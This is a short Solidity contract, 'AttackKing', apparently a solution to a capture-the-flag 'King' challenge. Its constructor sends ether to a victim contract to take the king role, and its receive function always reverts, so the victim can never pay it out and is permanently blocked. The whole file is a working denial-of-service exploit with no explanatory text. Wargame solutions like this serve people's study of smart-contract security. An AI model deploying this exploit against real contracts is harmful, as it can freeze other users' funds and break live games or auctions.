// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract AttackKing {

    constructor(address _victim) payable {
        _victim.call{value: 0.002 ether}("");
    }

    receive() external payable {
        revert();
    }
}